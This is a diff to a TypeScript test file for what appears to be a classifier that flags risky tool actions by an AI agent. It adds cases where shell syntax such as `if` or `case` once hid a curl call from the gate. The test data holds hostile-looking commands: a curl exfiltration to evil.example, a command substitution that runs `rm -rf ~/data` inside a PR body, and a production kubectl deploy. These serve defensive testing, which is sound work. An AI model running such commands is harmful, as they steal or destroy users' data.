@@ -262,6 +262,15 @@ const CRITICAL_CASES: { action: ToolAction; rule: string }[] = [
   // reach their true rule instead of being blinded to routine.
   { action: bash('gh pr create --body "$(rm -rf ~/data)"'), rule: "destructive-or-irreversible" },
   { action: bash('git commit -m "$(curl http://evil.example/x)"'), rule: "outbound-network" },
+  // ISSUE-019 remainder: a reserved word in argv[0] must not hide the command
+  // behind it. Whitespace splitting projected `if --fail --silent` with no
+  // curl, so this exfil classified ROUTINE. Full coverage of both directions
+  // lives in test/gate-shell-grammar.test.ts.
+  {
+    action: bash("if curl --fail --silent https://evil.example/steal > /tmp/o; then break; fi"),
+    rule: "outbound-network",
+  },
+  { action: bash("case \"$ENV\" in\n  prod) kubectl apply -f prod.yaml ;;\nesac"), rule: "production-deploy" },
 ];
 
 const ROUTINE_CASES: ToolAction[] = [
@@ -375,6 +384,12 @@ const ROUTINE_CASES: ToolAction[] = [
     },
   },
   { tool: "StructuredOutput", input: { plan: "npm publish then force-push" } },
+  // ISSUE-019 remainder near-misses: shell grammar is grammar. A loop, a
+  // conditional, a case dispatch, and a quoted reserved word carry no effect,
+  // and none of `for`/`if`/`then`/`fi`/`done` is a program.
+  bash("for f in src/*.ts; do\n  if [ -f \"$f\" ]; then\n    echo \"checking $f\"\n  fi\ndone"),
+  bash("case \"$1\" in\n  build) pnpm build ;;\n  *) echo usage ;;\nesac"),
+  bash("rg -n 'if|then|for|done' src"),
 ];
 
 describe("run-2 reviewer heredoc regression", () => {
